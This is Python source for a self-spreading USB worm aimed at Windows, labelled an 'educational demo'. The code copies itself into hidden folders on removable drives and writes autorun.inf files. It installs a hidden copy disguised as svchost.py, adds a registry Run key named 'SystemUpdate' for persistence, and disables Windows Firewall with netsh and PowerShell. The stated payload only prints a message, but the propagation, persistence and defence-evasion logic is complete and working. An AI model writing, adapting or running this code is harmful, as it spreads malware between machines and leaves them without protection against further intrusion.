r"""
USB Spreading Worm - Compact Educational Demo
==============================================
Platform: Windows 10/11
Purpose: USB propagation with Windows Defender/Firewall disable

TECHNIQUES:
✓ USB detection (removable drive scanning)
✓ Hidden file attributes (system folders)
✓ Autorun.inf (legacy compatibility)
✓ Windows Firewall disable on spread
✓ Payload: Hello World

EXECUTION: Monitors USB drives -> Copies worm -> Disables defenses -> Prints payload
"""

import os
import sys
import subprocess
import time
import platform
import ctypes
import string
from typing import List

class USBWorm:
    """Compact USB worm with defense evasion."""

    def __init__(self):
        self.worm_path = os.path.abspath(__file__)
        self.infected_drives: List[str] = []
        self.hidden_folders = ["SystemVolumeInformation", "$RECYCLE.BIN", "Windows.old"]
        self.local_install_path = os.path.join(os.environ.get('APPDATA', 'C:\\'), 'System32', 'svchost.py')

    # ========================================================================
    # USB DETECTION
    # ========================================================================

    def detect_usb_drives(self) -> List[str]:
        """Detect USB drives (Windows only)."""
        if platform.system() != "Windows":
            return []
        
        try:
            usb_drives = []
            kernel32 = ctypes.windll.kernel32
            
            for drive_letter in string.ascii_uppercase:
                path = f"{drive_letter}:\\"
                if os.path.exists(path):
                    drive_type = kernel32.GetDriveTypeW(path)
                    # DRIVE_REMOVABLE = 2
                    if drive_type == 2 and drive_letter != 'C':
                        usb_drives.append(path)
            
            return usb_drives
        except Exception:
            return []


    # ========================================================================
    # DEFENSE EVASION
    # ========================================================================

    def install_to_local_system(self) -> bool:
        """Copy worm to local system for persistence."""
        if platform.system() != "Windows":
            return False
        
        try:
            # Create directory
            os.makedirs(os.path.dirname(self.local_install_path), exist_ok=True)
            
            # Copy worm to AppData
            if not os.path.exists(self.local_install_path):
                with open(self.worm_path, 'rb') as src:
                    with open(self.local_install_path, 'wb') as dst:
                        dst.write(src.read())
                
                # Hide it
                self.make_hidden(self.local_install_path)
                
                # Add to startup
                self.add_startup_persistence()
                return True
        except Exception:
            return False
        
        return False

    def add_startup_persistence(self) -> bool:
        """Add registry startup entry."""
        try:
            startup_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
            result = subprocess.run(
                ['reg', 'add', f'HKCU\\{startup_key}', '/v', 'SystemUpdate', 
                 '/t', 'REG_SZ', '/d', f'python "{self.local_install_path}"', '/f'],
                capture_output=True,
                timeout=5
            )
            return result.returncode == 0
        except Exception:
            return False

    def disable_windows_firewall(self) -> bool:
        """Disable Windows Firewall (Windows 7+ compatible)."""
        if platform.system() != "Windows":
            return False
        
        try:
            # Method 1: netsh (works on Windows XP/Vista/7/8/10/11)
            result = subprocess.run(
                ['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'],
                capture_output=True,
                timeout=10
            )
            if result.returncode == 0:
                return True
            
            # Method 2: PowerShell (Windows 8+, fallback)
            ps_cmd = 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false'
            result = subprocess.run(
                ['powershell', '-NoProfile', '-Command', ps_cmd],
                capture_output=True,
                timeout=10
            )
            return result.returncode == 0
        except Exception:
            return False

    def make_hidden(self, path: str) -> bool:
        """Make file hidden + system attribute (Windows)."""
        if platform.system() != "Windows":
            return False
        try:
            # FILE_ATTRIBUTE_HIDDEN (2) + FILE_ATTRIBUTE_SYSTEM (4) = 6
            ctypes.windll.kernel32.SetFileAttributesW(str(path), 6)
            return True
        except Exception:
            return False

    # ========================================================================
    # USB INFECTION
    # ========================================================================

    def copy_to_usb(self, drive: str) -> bool:
        """Copy worm to USB with hidden copies + autorun."""
        try:
            usb_root = drive
            
            # 1. Create hidden copy in system folder
            for hidden_folder in self.hidden_folders:
                try:
                    hidden_dir = os.path.join(usb_root, hidden_folder)
                    os.makedirs(hidden_dir, exist_ok=True)
                    worm_copy = os.path.join(hidden_dir, f"system.py")
                    
                    with open(self.worm_path, 'rb') as src:
                        with open(worm_copy, 'wb') as dst:
                            dst.write(src.read())
                    
                    self.make_hidden(hidden_dir)
                    self.make_hidden(worm_copy)
                    break
                except Exception:
                    continue
            
            # 2. Create autorun.inf
            try:
                autorun_path = os.path.join(usb_root, "autorun.inf")
                with open(autorun_path, 'w') as f:
                    f.write("[autorun]\n")
                    f.write(f"open=python {hidden_folder}\\system.py\n")
                    f.write("icon=shell32.dll,4\n")
                    f.write("label=USB Drive\n")
                self.make_hidden(autorun_path)
            except Exception:
                pass
            
            return True
        except Exception:
            return False


    # ========================================================================
    # MONITORING & EXECUTION
    # ========================================================================

    def monitor_usb(self, interval: int = 5) -> None:
        """Monitor for USB insertions and infect."""
        try:
            previous_drives = set(self.detect_usb_drives())
            
            while True:
                time.sleep(interval)
                current_drives = set(self.detect_usb_drives())
                new_drives = current_drives - previous_drives
                
                if new_drives:
                    for drive in new_drives:
                        if self.copy_to_usb(drive):
                            self.infected_drives.append(drive)
                            self.install_to_local_system()  # Spread to new machine
                            self.disable_windows_firewall()
                            print("Hello World")  # Payload
                
                previous_drives = current_drives
        except KeyboardInterrupt:
            pass
        except Exception:
            pass

    def execute_once(self) -> None:
        """One-time execution: infect all current USB drives + install locally."""
        try:
            # Step 1: Install to local system (enables spreading)
            if not os.path.exists(self.local_install_path):
                self.install_to_local_system()
            
            # Step 2: Infect USB drives
            usb_drives = self.detect_usb_drives()
            
            for drive in usb_drives:
                if self.copy_to_usb(drive):
                    self.infected_drives.append(drive)
            
            # Step 3: Disable defenses & run payload
            if self.infected_drives:
                self.disable_windows_firewall()
                print("Hello World")  # Payload
        except Exception:
            pass


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def infect_usb():
    """Main function for integration with main.py."""
    worm = USBWorm()
    worm.execute_once()
    return len(worm.infected_drives) > 0


if __name__ == '__main__':
    try:
        worm = USBWorm()
        
        if '--monitor' in sys.argv:
            print('[*] USB Monitoring Mode (Ctrl+C to stop)')
            worm.monitor_usb()
        else:
            print('[*] USB One-Time Infection Mode')
            worm.execute_once()
            print(f'[*] Infected drives: {len(worm.infected_drives)}')
    except Exception as e:
        print(f'[!] Error: {e}')
        sys.exit(1)
